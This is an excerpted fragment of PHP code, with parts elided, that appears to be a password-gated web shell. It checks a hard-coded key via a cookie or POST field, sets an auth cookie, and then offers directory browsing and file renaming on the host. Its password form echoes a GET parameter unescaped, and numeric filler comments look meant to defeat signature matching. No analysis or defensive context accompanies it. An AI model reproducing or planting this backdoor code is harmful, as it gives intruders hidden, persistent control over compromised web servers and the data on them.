...
$auth_key = "44192b268ae65475f27e2087e2f5db34";
...
$pass = false;
if (isset($_COOKIE['pw_name_53808'])) {
    if(($_COOKIE['pw_name_53808']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_53808'])) {
        if(($_POST['pw_name_53808']) == $auth_key) {
            setcookie("pw_name_53808", $_POST['pw_name_53808']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_53808' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1722944340250276 1722944340659972 1722944340603142 1722944340889617
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1722944340250276 1722944340659972 1722944340603142 1722944340889617
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1722944340250276 1722944340659972 1722944340603142 1722944340889617
            $name = PATH . "/" . $_GET['r'];
